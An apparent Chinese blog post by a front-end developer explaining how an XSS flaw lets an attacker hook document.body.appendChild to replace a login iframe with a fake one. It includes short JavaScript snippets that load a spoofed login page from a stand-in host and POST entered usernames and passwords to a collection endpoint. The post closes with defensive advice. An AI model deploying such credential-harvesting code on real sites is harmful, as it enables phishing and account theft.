@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next gemini" lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.6.0">
+
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.6.0',
+    sidebar: {"position":"left","width":300,"display":"post","offset":12,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="需求今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：  如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。  what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="「 安全 」从iframe说到万物皆可hook">
+<meta property="og:url" content="https://Evalotus.github.io/2019/02/15/从iframe安全说到万物皆可hook/index.html">
+<meta property="og:site_name" content="Eva&#39;s Blog">
+<meta property="og:description" content="需求今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：  如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。  what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://evalotus.github.io/images/qian1.png">
+<meta property="og:image" content="https://evalotus.github.io/images/qian3.png">
+<meta property="og:updated_time" content="2019-02-18T08:53:30.695Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="「 安全 」从iframe说到万物皆可hook">
+<meta name="twitter:description" content="需求今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：  如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。  what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！">
+<meta name="twitter:image" content="https://evalotus.github.io/images/qian1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Eva's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://Evalotus.github.io/2019/02/15/从iframe安全说到万物皆可hook/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>「 安全 」从iframe说到万物皆可hook | Eva's Blog</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ca3d224de40fbf734d1e623cf68e0fb4";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion .logo-line-before i { left: initial; }
+    .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Eva's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">进一寸有一寸的欢喜</h1>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-movies">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/movies" rel="section"><i class="menu-item-icon fa fa-fw fa-film"></i> <br>Movies</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://Evalotus.github.io/2019/02/15/从iframe安全说到万物皆可hook/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eva">
+      <meta itemprop="description" content="JavaScript, HTML, CSS, Node JS, Front-end Develop">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eva's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">「 安全 」从iframe说到万物皆可hook
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-02-15 17:06:31" itemprop="dateCreated datePublished" datetime="2019-02-15T17:06:31+08:00">2019-02-15</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/15/从iframe安全说到万物皆可hook/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/02/15/从iframe安全说到万物皆可hook/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：</p>
+<blockquote>
+<p>如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。</p>
+</blockquote>
+<p>what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！</p>
+<p>作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。<br><a id="more"></a></p>
+<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>但是作为一个与用户交互最紧密的前端，登录页总是302跳转到新的页面对于用户来说其实是非常不友好的，打断了用户操作，跳过去跳过来的都晕了，如果能够弹窗登录，那抢手机的路上将一气呵成，非常愉快呀！<br>弹窗登录一般都是 iframe 实现的，因为大家一般都是 sso 登录，也就是说要做出一个通用的框架，所以一般使用 iframe。</p>
+<p>我弱弱的说了句，嗯，百度好像也是 iframe 呀，其他也有很多厂商是 iframe 的，这样的问题并不是很严重吧。<br>没想到大佬们立刻就开始研究百度的弹窗。结论是：<br>做的很巧妙啊！点击之后才出弹窗，xss 一般都是一开始就进行篡改，但是这种方式的话，坏人没办法获取用户点击【登录】的时机，这样应该没那么容易篡改。</p>
+<h4 id="万物皆可hook"><a href="#万物皆可hook" class="headerlink" title="万物皆可hook"></a>万物皆可hook</h4><p>听得有点懵，后来才明白，他们就是想hook用户点击登录的click事件。</p>
+<p>哈哈，术业有专攻。终于轮到我们前端大展身手的时候了，他们是不知道我们的【万物皆可hook】定理。</p>
+<p>千千音乐盒为例：<br><img src="/images/qian1.png" alt=""></p>
+<p>点击登录之后，弹出了iframe，这时候一般都会有服务器交互，我们先看看chrome devtool的network，但是出现了好多条请求。这时候我们右键单击审查元素，看看iframe的src，其实凭经验来说，这种弹窗一般都是调用document.body.appendChild来添加在页面中，但是有更好的方法来佐证。</p>
+<p><img src="/images/qian3.png" alt=""><br>重要小tips：network中的Initiator会展示出发出请求的具体代码行数，点击一下就可以定位到具体是哪一行发出了这个请求。代码一般都压缩了的，点击下面的{}就可以格式化代码。果不其然，就是调用了appendChild，再看下html结构，显然是在append在body中的。</p>
+<p>感兴趣的可以查看chrome devTool的使用（TODO）。</p>
+<p>既然锁定了调用的是document.body.appendChild，那我们就可以放心的hook啦！<br>核心代码很简单，就是使用了js的call方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'hook success'</span>);</span><br><span class="line">  append.call(<span class="built_in">document</span>.body, el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们成功的hook了document.body.appendChild方法，在执行原来操作方式之前执行了我们的alert。</p>
+<p>大佬要求我完整的实现隐藏原来的弹窗，弹出自己实现的弹窗。</p>
+<p>那代码量应该不少吧。我们xss只能插入js，插入不了css，即使实现了也应该很丑吧。</p>
+<p>no，no，no。</p>
+<p>js啥都能插入!</p>
+<p>html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const fakeIframe = document.createElement(&apos;div&apos;);</span><br></pre></td></tr></table></figure>
+<p>css</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.style= &apos;border:1px solid #f8f8f8&apos;;</span><br></pre></td></tr></table></figure>
+<p>就是需要写好多dom操作的代码。</p>
+<p>or 直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.innerHTML=&apos;&lt;iframe allowtransparency=&quot;true&quot; style=&quot;border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;&quot;</span><br><span class="line">src=&quot;//passport.taihe.com/v2/web/popLogin.html?target=pop&amp;amp;u=https%3A%2F%2Fplay.taihe.com&amp;amp;staticPage=https%3A%2F%2Fplay.taihe.com%2Fplayer%2Ftpassjump.html&amp;amp;callback=tpass15504710495271&amp;amp;tpl=baidu_music&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>本来打算自己写个iframe 登录页，转念一想，直接把他的页面copy出来算了，美观靠谱又省事儿。<br>打开//passport.taihe.com/v2/web/popLogin.html，chrome dev tool network，copy出popLogin.html的代码。<br>加上</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.tpass-button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/badEva/collect'</span>,</span><br><span class="line">    type: <span class="string">'POST'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      username: $(<span class="string">'.tpass-text-input-userName'</span>).val(),</span><br><span class="line">      pwd: $(<span class="string">'.tpass-text-input-password'</span>).val(),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>部署在自己的server上，得到url如//passport.badeva.com/fakeLogin.html</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fakeIframe = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  fakeIframe.innerHTML = <span class="string">'&lt;iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;" src="//passport.badeva.com/fakeLogin.html" &gt;&lt;/iframe&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>理论上四行代码就可以搞定了。</p>
+<p>其实还有很多技术点可以细挖，先不展开说了。</p>
+<h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>回想起来，这些思路还是来自于hook极验验证结果时得出来的。</p>
+<p>引入了极验的sdk，但是用户每次滑动点选的结果对接入方来说是透明的，但是我们需要这些数据来进行分析，怎么才能得到用户每次验证的结果呢？</p>
+<p>大家都说，页面都是你的页面，连个结果都获取不到？？？</p>
+<p>计算每次的轨迹？</p>
+<p>思考良久，脑子里突然闪过iOS里的method swizzling，具体是干啥的也不记得了，只记得method swizzling 黑魔法。</p>
+<p>我的地盘我做主，怎么可能获取不到呢？</p>
+<p>脑子里又闪过hook这个词。</p>
+<p>对了，他们总是要给服务端结果的啊！hook他们的请求！</p>
+<p>跨域只能jsonp，jsonp一般都是document.header.appendChild，轻轻松松得到结果，具体代码你可以自己试着写写。</p>
+<p>但是随着时代的进步，极验也换用了CORS来进行跨域，hook Ajax就没有那么容易了。</p>
+<h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>大佬们很震惊，难道没有别的办法可以防止被hook吗？其实我们还是希望可以使用iframe来提升用户体验的。</p>
+<p>但事实上js注入之后，可以做的事儿太多了。弹出iframe绕不过appendChild那些基础API，有xss漏洞就相当于敞开大门让坏人进来。</p>
+<p>几乎是防不胜防。</p>
+<p>所以更是提醒我们为了安全：</p>
+<p>1.要尽量避免xss漏洞，请看这篇（TODO）</p>
+<p>2.引入第三方js，一定要注意查看下network中是否有什么不清不楚的接口，偷偷的搜集了某些信息上送给别的服务端。</p>
+<p>从这篇文章获取到的，你可以自己总结下。<br>顺便思考下hook Ajax的方法。</p>
+<h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>虽然很绝望，但是首先，你需要一个xss漏洞。</p>
+<p>大佬们微微一笑，xss漏洞远比你想象的多得多，即使简单的一个登录页就这段时间都检测出来了好多xss漏洞。</p>
+<p>iframe白名单这个口子真的不能那么容易就打开呀，公司其实有很多赶工期的项目，开发周期短，代码写成啥样大家都懂，其实很容易出现xss漏洞。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/images/wechat_qrcode.jpg" alt="Eva wechat" style="width: 200px; max-width: 100%;">
+    <div>关注Eva的意如小馆，更方便的与我交流</div>
+</div>
+
+      </div>
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag"># 安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/14/JS检测爬虫/" rel="next" title="「 puppeteer 」从puppeteer谈前端爬虫检测和绕过">
+                <i class="fa fa-chevron-left"></i> 「 puppeteer 」从puppeteer谈前端爬虫检测和绕过
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Eva">
+            
+              <p class="site-author-name" itemprop="name">Eva</p>
+              <p class="site-description motion-element" itemprop="description">JavaScript, HTML, CSS, Node JS, Front-end Develop</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/EvaLotus" title="GitHub &rarr; https://github.com/EvaLotus" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:evacoder@126.com" title="E-Mail &rarr; mailto:evacoder@126.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#需求"><span class="nav-number">1.</span> <span class="nav-text">需求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#思考"><span class="nav-number">2.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#万物皆可hook"><span class="nav-number">3.</span> <span class="nav-text">万物皆可hook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#回溯"><span class="nav-number">4.</span> <span class="nav-text">回溯</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#展望"><span class="nav-number">5.</span> <span class="nav-text">展望</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#彩蛋"><span class="nav-number">6.</span> <span class="nav-text">彩蛋</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-Travel"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eva</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.6.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.6.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+    
+  
+  <script src="//cdn.jsdelivr.net/npm/valine@1.3.3/dist/Valine.min.js"></script>
+
+  <script>
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '7Ck7B9LoU0iNuR7sVgC3Sscr-gzGzoHsz',
+        appKey: 'GURQk3swSriTo8QzVtgoUDnk',
+        placeholder: '有什么想对Eva说的呢？',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'5' || 10,
+        visitor: false
+    });
+  </script>
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
